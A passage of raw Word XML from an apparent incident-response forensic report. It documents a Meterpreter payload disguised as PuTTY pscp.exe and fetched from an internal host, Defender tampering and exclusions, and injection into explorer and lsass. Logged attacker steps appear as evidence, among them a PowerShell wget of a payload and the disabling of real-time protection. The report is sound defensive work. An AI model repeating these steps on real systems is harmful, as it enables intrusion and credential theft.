                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:56.299955</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>GKAPE.EXE</w:t>
              <w:br/>
              <w:t>runs=3 hash=274C6018 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\GKAPE.EXE-274C6018.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Triage of automatic detections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Triaged all critical/high/medium detections (Hayabusa, Chainsaw, Zircolite) and verified source events in raw.evtx. True positives: (F-003) Defender 1116/1117 Trojan:Win64/Meterpreter.E on Downloads\pscp.exe from http://10.0.0.12:8080/pscp.exe at 10:16:43, 10:17:53, 10:19:36 UTC; (F-004) Defender tampering: SpyNet/sample submission off, TamperProtection toggled, exclusion C:\Payloads\ at 10:19:24, RTP disabled 10:19:46 and 11:02:12 (5001, Sysmon 13 DisableRealtimeMonitoring); (F-005) C:\Payloads\pscp.exe executed 11:03:09 (Sysmon 1 PID 2196 GUID {e6e9f951-0ded-654e-8f01-000000000500}, SHA256 ABBF7B5F…C6CF931, MD5 DED9E58D…5F1, PuTTY PSCP 0.79 version info = masquerade; Prefetch run 1) spawning explorer.exe PID 7324 {e6e9f951-0ded-654e-9001-000000000500} with CreateRemoteThread (migration), then explorer→lsass remote thread 11:03:56; (F-006) post-exploitation from explorer 7324: cmd 6600 → tracert x3, quser; MSFConsole PowerShell host in explorer.exe (Invoke-DcSync bootstrap) at 11:06:40; cmd 5848 → powershell 736 → wget http://10.0.0.12:8080/1.exe (Sysmon 3 to 10.0.0.12:8080) and tasklist. Related files C:\Payloads\test.exe and C:\Users\medmondson\1.exe (same size 986,624 B) show no execution evidence. IOCs I-001..I-006 and timeline T-001..T-007 recorded. FPs documented in note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-003: Windows Defender detected Trojan:Win64/Meterpreter.E in pscp.exe downloaded from http://10.0.0.12:8080/pscp.exe (3 download attempts)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evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>initial access / malware detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1036.005, T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518 → 2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Microsoft-Windows-Windows Defender/Operational: EID 1116 (RecordIDs 15,16 at 10:16:43–44 UTC; 22,23 at 10:17:53–54; 26,27 at 10:19:36) and EID 1117 action taken (RecordIDs 17 at 10:16:52, 24 at 10:17:59, 28 at 10:19:41) — threat "Trojan:Win64/Meterpreter.E" (Severe), file C:\Users\medmondson\Downloads\pscp.exe, webfile origin http://10.0.0.12:8080/pscp.exe, detecting process C:\Windows\System32\browser_broker.exe (Edge downloads, browser pids 8820, 8364, 4140), user DESKTOP-KJ81A5A\medmondson. Fired Hayabusa 'Defender Alert (Severe)' / 'Antivirus - Exploitation Framework Signature' (critical), Chainsaw/Zircolite 'Windows Defender Threat Detected'. $MFT: Edge cache copy ...\MicrosoftEdge\Cache\A6816M2V\pscp[1].exe (986,624 bytes, created 10:16:38 UTC); C:\Payloads\pscp.exe (MFT entry 85781, 986,624 bytes, $SI created 10:20:10, modified 10:19:53) with Zone.Identifier ADS 'ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe'. ShimCache lists both C:\Users\medmondson\Downloads\pscp.exe and C:\Payloads\pscp.exe (mtime 10:19:53).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive. The file named after the PuTTY SCP client is a Meterpreter payload served from the internal host 10.0.0.12 (HTTP 8080). Defender blocked/remediated it three times; afterwards (see Defender tampering finding) the file was re-saved into the excluded folder C:\Payloads\ at 10:19:53–10:20:10 UTC, which bypassed detection. Same size (986,624 bytes) as C:\Payloads\test.exe and C:\Users\medmondson\1.exe, suggesting the same payload under several names (to verify by hashing).</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10:16:43.841943</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe</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evtxecmd/evtxecmd_0.csv#23714</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</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evtxecmd/evtxecmd_0.csv#23715</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:52.220594</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643</w:t>
              <w:br/>
              <w:t xml:space="preserve">Microsoft-Windows-Windows Defender/Operational 1117 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform performed an action to protect your system from malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:16:43.470Z | Process </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23716</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028923</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8364,ProcessStart:133440850738826349</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:17:53.875Z | Process (if real-time detection): C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23722</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431470</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:4140,ProcessStart:133440851762938641</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:19:36.274Z | Process (if real-time detection): C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23726</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:41.471520</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webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:4140,ProcessStart:133440851762938641</w:t>
              <w:br/>
              <w:t xml:space="preserve">Microsoft-Windows-Windows Defender/Operational 1117 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform performed an action to protect your system from malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:19:36.274Z | Process </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23727</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>critical</w:t>
              <w:br/>
              <w:t>Defender Alert (Severe) | {"Threat":"Trojan:Win64/Meterpreter.E","Severity":"Severe","Type":"Trojan","User":"DESKTOP-KJ81A5A\\medmondson","Path":"file:_C:\\Users\\medmondson\\Downloads\\pscp.exe; webfile:_C:\\Users\\medmondson\\Downloads\\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8820,ProcessStart:133440850044617643","Proc":"C:\\Windows\\System32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5892</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</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w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115203</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</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C:\Payloads\pscp.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M) ; $SI MFT change (C) ; $FN access (A)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\A6816M2V\pscp[1].exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#114957</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-005: Execution of C:\Payloads\pscp.exe (Meterpreter masquerading as PuTTY PSCP) and migration/injection into a spawned explorer.exe, then into lsass.exe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evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>execution / privilege escalation / defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1055, T1036.005, T1059.001, T1003.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.877971 → 2023-11-10 11:03:56.300284</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>PowerShell/Operational 4104: 'cd C:\Payloads\' (11:03:03), 'ls' (11:03:04), '.\pscp.exe' (11:03:09.877, RecordID 57). Sysmon EID 1 (RecordID 305) 11:03:09.884 UTC: Image C:\Payloads\pscp.exe, PID 2196, ProcessGuid {e6e9f951-0ded-654e-8f01-000000000500}, FileVersion 'Release 0.79', Description 'Command-line SCP/SFTP client', Product 'PuTTY suite', Company 'Simon Tatham', OriginalFileName PSCP, IntegrityLevel High, LogonId 0x15347, MD5=DED9E58DD95A88A4BEE89B74A65F05F1, SHA256=ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931, IMPHASH=ADD361A4F3939AF38D11873F1D74BDED; parent powershell.exe PID 1088 {e6e9f951-0de1-654e-8801-000000000500}. Sysmon EID 1 (RecordID 306) 11:03:09.989: C:\Windows\explorer.exe, CommandLine 'explorer.exe', PID 7324, ProcessGuid {e6e9f951-0ded-654e-9001-000000000500}, parent C:\Payloads\pscp.exe {…8f01…} (MD5=9FBBF189473A313776019D2EAA72A47A, SHA256=CEF64201A97E08834F5C8952907A1719531A7D99B53309CB2E2956F40CFF3486 = legitimate explorer binary). Sysmon EID 8 CreateRemoteThread (RecordID 307) 11:03:09.990: source pscp.exe 2196 → target explorer.exe 7324, StartAddress 0x0000000000B30000, no StartModule. Sysmon EID 8 (RecordID 309) 11:03:56.300: source explorer.exe 7324 {…9001…} → target C:\Windows\system32\lsass.exe PID 648 {e6e9f951-0900-654e-0c00-000000000500}, StartAddress 0x0000028F43080000. Prefetch PSCP.EXE-1DCA12FC.pf: RunCount 1, LastRun 11:03:09.900 UTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>pscp.exe is the malicious executable (Defender signature Meterpreter, version info copied from PuTTY pscp 0.79 = masquerading). It spawned a new, non-shell explorer.exe (parent pscp.exe, not userinit; the legitimate shell is PID 2432 {e6e9f951-0907-654e-5c00-000000000500}) and injected code into it via CreateRemoteThread at an unbacked address: this is the Meterpreter 'migrate' target. From explorer 7324 a remote thread was created in lsass.exe 46 s later, consistent with a further migration to SYSTEM or credential access (e.g. hashdump/kiwi) — the purpose of the lsass thread is an interpretation. Detections (Hayabusa 'Proc Injection') are on the same Sysmon source; Prefetch provides independent confirmation of execution.</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11:03:09.989870</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>explorer.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | MD5=9FBBF189473A313776019D2EAA72A47A,SHA256=CEF64201A97E08834F5C8952907A1719531A7D99B53309CB2E2956F40CFF3486,IMPHASH=D505016A935B17367AA0263582F3F1E2 | ParentProcess: C:\Payloads\p</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.990398</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
